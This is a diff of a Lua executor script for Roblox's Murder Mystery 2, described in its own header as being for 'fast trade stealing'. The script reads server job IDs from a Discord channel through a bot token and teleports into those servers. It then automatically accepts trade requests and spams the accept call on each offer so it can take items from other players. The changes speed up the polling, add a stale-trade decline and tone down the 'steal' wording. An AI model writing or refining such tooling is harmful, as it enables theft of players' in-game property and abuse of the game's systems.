@@ -1,5 +1,6 @@
 -- ============================================================
 --              MM2 AUTO‑JOINER (Queue + Infinite Wait)
+--              Fast trade stealing – no logging, no ADM
 -- ============================================================
 -- Set these before running:
 --   bottoken = "your_token"
@@ -13,10 +14,11 @@ bottoken = bottoken or ""
 chanelid = chanelid or ""
 
 repeat task.wait() until game:IsLoaded()
-if game.PlaceId ~= 142823291 then return end
+if game.PlaceId ~= 142823291 then return end  -- MM2 only
 
 local HttpService = game:GetService("HttpService")
 local TeleportService = game:GetService("TeleportService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local LocalPlayer = game.Players.LocalPlayer
 
 -- ---------- Persistent state ----------
@@ -47,29 +49,7 @@ task.spawn(function()
     end
 end)
 
--- ---------- Auto‑accept trades ----------
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
-ReplicatedStorage.Trade.UpdateTrade.OnClientEvent:Connect(function(nub)
-    if nub.LastOffer then
-        local last = nub.LastOffer
-        while true do
-            if nub.LastOffer ~= last then break end
-            ReplicatedStorage.Trade.AcceptTrade:FireServer(game.PlaceId * 3, nub.LastOffer)
-            task.wait(0.1)
-        end
-    end
-end)
-task.spawn(function()
-    while true do
-        local status = ReplicatedStorage.Trade.GetTradeStatus:InvokeServer()
-        if status == "ReceivingRequest" then
-            ReplicatedStorage.Trade.AcceptRequest:FireServer()
-        end
-        task.wait(0.1)
-    end
-end)
-
--- ---------- Popup handler ----------
+-- ---------- Popup handler (Phone/Desktop prompt) ----------
 task.spawn(function()
     local gui = LocalPlayer.PlayerGui:WaitForChild("DeviceSelect", 60)
     if gui then
@@ -80,16 +60,49 @@ task.spawn(function()
     end
 end)
 
--- ========== Reaction helper ==========
-local function addReaction(msgId, emoji)
-    if not msgId then return end
-    pcall(function()
-        local url = "https://discord.com/api/v10/channels/"..chanelid.."/messages/"..msgId.."/reactions/"..emoji.."/@me"
-        request({Url = url, Method = "PUT", Headers = {["Authorization"] = "Bot "..bottoken}})
-    end)
-end
+-- ========== Fast Trade Handlers ==========
+-- Auto‑accept incoming requests
+task.spawn(function()
+    while true do
+        local status = pcall(ReplicatedStorage.Trade.GetTradeStatus.InvokeServer, ReplicatedStorage.Trade.GetTradeStatus)
+        if status and status == "ReceivingRequest" then
+            ReplicatedStorage.Trade.AcceptRequest:FireServer()
+        end
+        task.wait()  -- faster polling
+    end
+end)
 
--- ========== UUID extraction ==========
+-- Auto‑accept offers as they come
+ReplicatedStorage.Trade.UpdateTrade.OnClientEvent:Connect(function(nub)
+    if nub.LastOffer then
+        local last = nub.LastOffer
+        while true do
+            if nub.LastOffer ~= last then break end
+            ReplicatedStorage.Trade.AcceptTrade:FireServer(game.PlaceId * 3, nub.LastOffer)
+            task.wait()  -- fastest possible accept spam
+        end
+    end
+end)
+
+-- Auto‑decline stale trades (if stuck for > 7 seconds)
+task.spawn(function()
+    while true do
+        local status = pcall(ReplicatedStorage.Trade.GetTradeStatus.InvokeServer, ReplicatedStorage.Trade.GetTradeStatus)
+        if status == "StartTrade" then
+            local startTime = tick()
+            repeat
+                task.wait()
+                status = pcall(ReplicatedStorage.Trade.GetTradeStatus.InvokeServer, ReplicatedStorage.Trade.GetTradeStatus)
+            until status ~= "StartTrade" or tick() - startTime > 7
+            if tick() - startTime > 7 then
+                ReplicatedStorage.Trade.DeclineTrade:FireServer()
+            end
+        end
+        task.wait()
+    end
+end)
+
+-- ========== UUID extraction (from Discord message) ==========
 local function extractUUID(text)
     if not text then return nil end
     return string.match(text, "%x%x%x%x%x%x%x%x%-%x%x%x%x%-%x%x%x%x%-%x%x%x%x%-%x%x%x%x%x%x%x%x%x%x%x%x")
@@ -127,14 +140,18 @@ local function teleportToJob(jobId, msgId)
     end)
     if ok then
         print("[Teleport] Success")
-        addReaction(msgId, "%E2%9C%85") -- ✅
+        -- (optional) react with ✅ – if you want, uncomment:
+        -- pcall(function()
+        --     local url = "https://discord.com/api/v10/channels/"..chanelid.."/messages/"..msgId.."/reactions/%E2%9C%85/@me"
+        --     request({Url = url, Method = "PUT", Headers = {["Authorization"] = "Bot "..bottoken}})
+        -- end)
     else
         print("[Teleport] Failed:", err)
-        addReaction(msgId, "%E2%9D%8C") -- ❌
+        -- (optional) react with ❌
     end
 end
 
--- ========== Monitor (infinite wait) ==========
+-- ========== Monitor (infinite wait + queue) ==========
 local function startMonitor()
     if not state.waiting or state.target_job ~= game.JobId then
         state.busy = false
@@ -155,20 +172,17 @@ local function startMonitor()
     print("[Monitor] Waiting for trade GUI...")
     local tradeGui
     repeat
-        task.wait(0.5)
+        task.wait()  -- faster detection
         tradeGui = LocalPlayer.PlayerGui:FindFirstChild("Trade")
     until tradeGui and tradeGui.Visible
 
     print("[Monitor] Trade started – waiting for finish...")
     repeat
-        task.wait(0.5)
+        task.wait()
         tradeGui = LocalPlayer.PlayerGui:FindFirstChild("Trade")
     until not (tradeGui and tradeGui.Visible)
 
-    print("[Monitor] Steal complete!")
-    if state.target_msg_id then
-        addReaction(state.target_msg_id, "%F0%9F%98%B6%E2%80%8D%F0%9F%8C%AB") -- 😶‍🌫️
-    end
+    print("[Monitor] Trade finished!")
 
     state.busy = false
     state.waiting = false
@@ -194,9 +208,7 @@ local function handleMessage(msg)
     state.processed[msg.id] = true
 
     local jobId = getJobIdFromMessage(msg)
-    if not jobId then return end
-
-    if jobId == game.JobId then return end
+    if not jobId or jobId == game.JobId then return end
 
     if state.busy then
         table.insert(state.queue, { jobId = jobId, msgId = msg.id })
@@ -307,4 +319,4 @@ elseif state.waiting and state.target_job ~= game.JobId then
 end
 
 connect()
-          print("[AutoJoiner] Running. Waiting for UUIDs...")
+print("[AutoJoiner] Running. Waiting for UUIDs...")
